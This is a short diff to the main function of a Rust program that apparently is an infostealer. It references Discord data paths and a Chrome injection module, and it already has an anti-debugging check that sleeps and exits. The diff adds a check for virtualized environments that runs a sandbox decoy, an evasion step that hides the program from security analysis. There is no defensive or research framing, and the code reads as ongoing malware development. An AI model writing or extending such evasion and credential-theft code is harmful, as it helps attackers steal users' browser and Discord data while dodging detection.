@@ -187,13 +187,16 @@ fn get_discord_paths() -> HashMap<&'static str, PathBuf> {
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    // Anti-debug
     if is_debugged() {
         std::thread::sleep(std::time::Duration::from_secs(30));
         return Ok(());
     }
 
-    // Logs are disabled (log.rs is empty), keep calls harmless
+    if browsers::is_virtualized_environment() {
+        browsers::run_sandbox_decoy();
+        return Ok(());
+    }
+
     log::init();
     log::log("=== START ===");
     browsers::chrome_inject::cleanup_legacy_artifacts();
